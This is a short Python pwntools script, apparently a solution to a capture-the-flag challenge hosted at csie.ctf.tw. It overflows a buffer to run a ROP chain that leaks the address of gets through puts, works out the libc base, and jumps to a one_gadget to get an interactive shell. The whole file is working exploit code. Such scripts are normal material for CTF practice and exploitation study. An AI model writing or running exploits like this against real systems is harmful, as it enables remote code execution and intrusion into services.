#!/usr/bin/python
from pwn import *

host = 'csie.ctf.tw'
port = 10127
#host = 'localhost'
#port = 4000

context.arch = 'amd64'

r = remote(host, port)
buf = 0x00602000 - 0x500
main = 0x4005b7

pop_rdi = 0x0000000000400673
leave_ret = 0x00000000004005ff

gets_plt = 0x4004b0
gets_got = 0x0000000000601020
puts_plt = 0x4004a0
puts_base = 0x00000000000809c0
gets_base = 0x00000000000800b0
system_base = 0x4f440
payload = flat([buf, pop_rdi, gets_got, puts_plt, main])
r.sendline('a'*8 + payload)
r.recvuntil('a'*8 + '\n')
gets_libc = u64(r.recvuntil('\n').strip().ljust(8, '\x00'))
print ('gets : ', hex(gets_libc))
libc = gets_libc - gets_base
system = system_base + libc
puts = puts_base + libc
#system = gets_libc - 0x299f0
print ('system : ', hex(system))
#r.interactive()
one_gadget = 0x4f2c5 + libc
#payload2 = flat([pop_rdi, buf + 0x20, system])
r.sendline('a'*16 + p64(one_gadget))
r.recvuntil('\n')
r.interactive()


